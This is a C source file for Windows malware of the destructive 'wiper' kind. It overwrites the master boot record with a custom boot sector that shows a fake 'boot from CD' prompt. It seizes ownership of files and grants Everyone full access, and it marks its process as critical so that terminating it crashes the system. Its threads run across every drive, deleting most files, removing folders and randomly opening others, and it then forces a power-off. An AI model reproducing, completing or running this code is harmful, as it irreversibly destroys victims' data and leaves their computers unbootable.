#include "haste.h"

CONST CHAR MasterBootRecordData[512] = {
	0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0xFB, 0xB8,
	0x03, 0x00, 0xCD, 0x10, 0xB4, 0x02, 0x31, 0xD2, 0xCD, 0x10, 0xBE, 0x4A,
	0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD, 0x10, 0xEB, 0xF5,
	0xB4, 0x00, 0xCD, 0x16, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0,
	0x8E, 0xC0, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0x89, 0xF8, 0xD0, 0xE8, 0x8A,
	0x1E, 0x72, 0x7C, 0x00, 0xD8, 0xAA, 0xE2, 0xF3, 0xFE, 0x06, 0x72, 0x7C,
	0xEB, 0xE3, 0x50, 0x72, 0x65, 0x73, 0x73, 0x20, 0x61, 0x6E, 0x79, 0x20,
	0x6B, 0x65, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x62, 0x6F, 0x6F, 0x74, 0x20,
	0x66, 0x72, 0x6F, 0x6D, 0x20, 0x43, 0x44, 0x20, 0x6F, 0x72, 0x20, 0x44,
	0x56, 0x44, 0x2E, 0x2E, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL WINAPI SetPriv(HANDLE hToken, LPCWSTR lpwPriv, BOOL blEnablePriv) {
	TOKEN_PRIVILEGES tokenPriv;
	LUID luid;

	if (!LookupPrivilegeValueW(NULL, lpwPriv, &luid)) {
		return FALSE;
	}

	tokenPriv.PrivilegeCount = 1;
	tokenPriv.Privileges[0].Luid = luid;

	if (blEnablePriv)
		tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tokenPriv.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		return FALSE;
	}

	return TRUE;
}

BOOL WINAPI TakeOwnership(LPCWSTR lpwFile) {
	BOOL blRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdministrator = NULL, pSIDEverybody = NULL;

	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS explicitAccess[NUM_ACES] = { 0 };

	DWORD dwResources;
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEverybody)) {
		goto cleanup;
	}

	explicitAccess[0].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[0].grfAccessMode = SET_ACCESS;
	explicitAccess[0].grfInheritance = NO_INHERITANCE;
	explicitAccess[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	explicitAccess[0].Trustee.ptstrName = (LPCWSTR)pSIDEverybody;

	explicitAccess[1].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[1].grfAccessMode = SET_ACCESS;
	explicitAccess[1].grfInheritance = NO_INHERITANCE;
	explicitAccess[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	explicitAccess[1].Trustee.ptstrName = (LPCWSTR)pSIDAdministrator;

	if (SetEntriesInAclW(NUM_ACES, explicitAccess, NULL, &pACL) != ERROR_SUCCESS) {
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwResources == ERROR_SUCCESS) {
		blRetval = TRUE;
		goto cleanup;
	}

	if (dwResources != ERROR_ACCESS_DENIED) {
		goto cleanup;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		goto cleanup;
	}

	if (!SetPriv(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) {
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdministrator, NULL, NULL, NULL);

	if (dwResources != ERROR_SUCCESS) {
		goto cleanup;
	}

	if (!SetPriv(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE)) {
		goto cleanup;
	}

	dwResources = SetNamedSecurityInfoW(lpwFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

	if (dwResources == ERROR_SUCCESS) {
		blRetval = TRUE;
	}

cleanup:
	if (pSIDAdministrator) FreeSid(pSIDAdministrator);
	if (pSIDEverybody) FreeSid(pSIDEverybody);
	if (pACL) LocalFree(pACL);
	if (hToken) CloseHandle(hToken);

	return blRetval;
}

BOOL WINAPI OverwriteBootRecord(VOID) {
	DWORD dwBytes;
	HANDLE hDevice;
	BOOL bCheck;

	hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	bCheck = WriteFile(hDevice, MasterBootRecordData, 512, &dwBytes, NULL);

	if (!bCheck) {
		CloseHandle(hDevice);
		return FALSE;
	}

	return TRUE;
}

BOOL WINAPI SetProcessAsCriticalProcess(VOID) {
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN blEnable, BOOLEAN blCurrentThread, PBOOLEAN pblEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN blNew, PBOOLEAN pblOld, BOOLEAN blScb);

	NTSTATUS ntValue;
	ULONG ulBreakTermination;
	BOOLEAN blUnused;
	HMODULE hNtdll;

	hNtdll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege) {
		ntValue = RtlAdjustPrivilege(20 /* SeDebugPrivilege */, TRUE, FALSE, &blUnused);
		if (ntValue) {
			ExitProcess(0);
			return FALSE;
		}
	}
	else {
		ExitProcess(0);
		return FALSE;
	}

	if (RtlSetProcessIsCritical) {
		ulBreakTermination = 1;
		ntValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntValue) {
			ExitProcess(0);
			return FALSE;
		}
	}
	else {
		ExitProcess(0);
		return FALSE;
	}

	return TRUE;
}

BOOL WINAPI OpenRandomFiles(LPCWSTR lpwDir) {
	TakeOwnership(lpwDir);

	WCHAR wcSearch[MAX_PATH] = { 0 };
	lstrcpyW(wcSearch, lpwDir);
	lstrcatW(wcSearch, L"*.*");

	WIN32_FIND_DATA findFiles;
	HANDLE hFind = FindFirstFileW(wcSearch, &findFiles);

	do {
		if (!lstrcmpW(findFiles.cFileName, L".") || !lstrcmpW(findFiles.cFileName, L"..") || findFiles.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			continue;
		}

		WCHAR wcPath[MAX_PATH] = { 0 };
		lstrcpyW(wcPath, lpwDir);
		lstrcatW(wcPath, findFiles.cFileName);

		TakeOwnership(wcPath);

		if (findFiles.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcatW(wcPath, L"\\");
			OpenRandomFiles(wcPath);
			RemoveDirectoryW(lpwDir);
		}
		else {
			if (rand() % 24) {
				DeleteFileW(wcPath);
			}
			else {
				ShellExecuteW(NULL, L"open", wcPath, NULL, lpwDir, SW_SHOW);
				Sleep(rand() % 5000);
			}
		}
	} 
	while (FindNextFileW(hFind, &findFiles));
	FindClose(hFind);
	RemoveDirectoryW(lpwDir);

	return TRUE;
}

VOID WINAPI OpenRandomDrives(VOID) {
	WCHAR wcDrives[512] = { 0 };
	DWORD dwGetDrives = GetLogicalDriveStringsW(512, wcDrives);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives, 0, NULL));
	for (DWORD i = 0; i < dwGetDrives; i++) {
		if (!wcDrives[i]) {
			CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives + (i + 1) * sizeof(WCHAR), 0, NULL));
			Sleep(rand() % 5000);
		}
	}
}

BOOL WINAPI ForcePoweroffComputer(VOID) {
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN blEnable, BOOLEAN blCurrentThread, PBOOLEAN pblEnabled);
	NTSTATUS(NTAPI * NtShutdownSystem)(SHUTDOWN_ACTION action);
	NTSTATUS(NTAPI * NtSetSystemPowerState)(POWER_ACTION systemAction, SYSTEM_POWER_STATE minSystemState, ULONG ulFlags);

	NTSTATUS ntValue;
	HMODULE hNtdll;
	BOOLEAN blUnused;
	BOOL blSuccess;

	hNtdll = LoadLibraryW(L"ntdll.dll");

	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	NtSetSystemPowerState = (PVOID)GetProcAddress(hNtdll, "NtSetSystemPowerState");
	NtShutdownSystem = (PVOID)GetProcAddress(hNtdll, "NtShutdownSystem");

	if (RtlAdjustPrivilege) {
		ntValue = RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, TRUE, FALSE, &blUnused);

		if (ntValue) {
			ExitProcess(0);
			return FALSE;
		}
	}

	if (NtSetSystemPowerState) {
		ntValue = NtSetSystemPowerState(PowerActionShutdownOff, PowerSystemShutdown, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
		if (!ntValue) {
			return TRUE;
		}
	}

	if (NtShutdownSystem) {
		ntValue = NtShutdownSystem(ShutdownPowerOff);

		if (!ntValue) {
			return TRUE;
		}
	}

	blSuccess = ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);

	if (!blSuccess) {
		ExitProcess(0);
		return FALSE;
	}

	return TRUE;
}